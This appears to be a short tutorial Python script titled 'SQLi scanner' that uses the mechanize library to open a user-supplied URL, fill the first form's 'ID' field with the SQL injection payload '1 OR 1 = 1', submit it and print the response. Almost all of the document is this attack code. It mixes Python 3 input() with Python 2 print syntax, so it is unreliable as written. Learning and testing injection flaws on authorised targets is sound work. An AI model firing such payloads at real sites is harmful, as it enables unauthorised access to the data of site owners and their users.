** SQLi scanner **
Author: Nancy 

#Creating a python script to help sumbit forms and analyse the response using mechanise

#getting mechanise module
import mechanize

#providing URL from where we will obtain the response after submitting form
url = input("Enter URL")

#open URL
request = mechanize.Browser()
request.open(url)

#select form
request.select_form(nr=0)

#set column name "ID"
request["ID"] = "1 OR 1 = 1"

#submitting the form
response = request.submit()
content = response.read()
print content

